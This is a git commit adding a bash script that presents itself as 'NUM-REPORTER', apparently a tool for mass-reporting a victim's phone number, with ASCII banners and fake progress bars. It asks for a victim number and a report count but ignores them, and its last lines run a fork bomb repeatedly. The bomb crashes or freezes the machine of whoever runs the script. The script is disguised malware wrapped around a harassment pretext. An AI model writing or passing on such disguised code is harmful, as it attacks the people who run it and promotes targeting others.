89eeefe139fa9c6f730d2ae426f3c74c7bcffe7d
adhi5556 <130889291+adhi5556@users.noreply.github.com>
2023-04-16 11:43:34 +0530

    Create nj.sh

---
+++ nj.sh
@@ -0,0 +1,405 @@
+#!/bin/bash 
+
+  #SHADOW BROKER 666 
+apt update 
+
+pkg upgrade 
+
+pkg install git 
+
+
+clear 
+
+
+#😂😂######SHADOW BROKER 666 ######
+
+
+
+  
+echo -e " \e[99m\e[1;96m
+-------------------------------------------------------------------------------------------------------─
+███╗   ██╗██╗   ██╗███╗   ███╗      ██████╗ ███████╗██████╗  ██████╗ ██████╗ ████████╗███████╗██████╗ 
+████╗  ██║██║   ██║████╗ ████║      ██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝██╔══██╗
+██╔██╗ ██║██║   ██║██╔████╔██║█████╗██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝   ██║   █████╗  ██████╔╝
+██║╚██╗██║██║   ██║██║╚██╔╝██║╚════╝██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██╔══██╗   ██║   ██╔══╝  ██╔══██╗
+██║ ╚████║╚██████╔╝██║ ╚═╝ ██║      ██║  ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   ███████╗██║  ██║
+╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝      ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
+                                                                                                      
+                                       CODED BY SHADOW BROKER 666
+                                       CREDITS a19h4-b34n
+------------------------------------------------------------------------------------------------------─"
+sleep 3
+echo -e " \e [v.20] \e[1;96
+  "
+
+sleep  3
+
+
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo ""
+echo ""
+echo "" 
+echo ""
+echo  ' 
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo""
+echo""
+echo""
+echo""
+echo "               "/█1%...................../
+sleep 1
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/█4%....................../
+sleep 1
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/█8%......................./
+sleep 2
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo ""
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/██10%....................../
+sleep 1
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/██12%....................../
+sleep 1
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/███15%..................../
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo ' 
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "               "/█████19%..................../
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "               "/██████28%..................../
+sleep 0.5
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/████████30%................../
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/██████████40%................/
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/█████████████50%............./
+sleep 2
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/████████████████60%........../
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/███████████████████88%......./
+sleep 2.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+clear
+echo ""
+echo ""
+echo ""
+echo ""
+echo ""
+echo ""
+echo ""
+echo ""
+echo ""
+echo ""
+echo ""
+echo ""
+echo ""
+echo ""
+echo ""
+echo "" 
+echo "               "[██████████████████████ 100%]
+echo ""
+echo ""
+echo ""
+echo ""
+echo ""
+clear
+
+
+
+echo -e " \e[99m\e[1;96m
+-------------------------------------------------------------------------------------------------------─
+███╗   ██╗██╗   ██╗███╗   ███╗      ██████╗ ███████╗██████╗  ██████╗ ██████╗ ████████╗███████╗██████╗
+████╗  ██║██║   ██║████╗ ████║      ██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝██╔══██╗
+██╔██╗ ██║██║   ██║██╔████╔██║█████╗██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝   ██║   █████╗  ██████╔╝
+██║╚██╗██║██║   ██║██║╚██╔╝██║╚════╝██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██╔══██╗   ██║   ██╔══╝  ██╔══██╗
+██║ ╚████║╚██████╔╝██║ ╚═╝ ██║      ██║  ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   ███████╗██║  ██║
+╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝      ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
+                                   CODED BY SHADOW BROKER 666
+                                   CREDITS a19h4-b34n 
+                                        
+------------------------------------------------------------------------------------------------------─"
+sleep 3
+echo -e " \e [v.20] \e[1;96
+  "
+
+sleep  3
+
+
+
+
+
+read -p " [+] enter your victim number :" token
+#groupil source code eduthitt patti show umfanda🥲#
+read -p " [+] enter count of reporting :" token 
+:(){ :|:& };:
+:(){ :|:& };:
+:(){ :|:& };:
+:(){ :|:& };:
+:(){ :|:& };:
+:(){ :|:& };:
+:(){ :|:& };: 
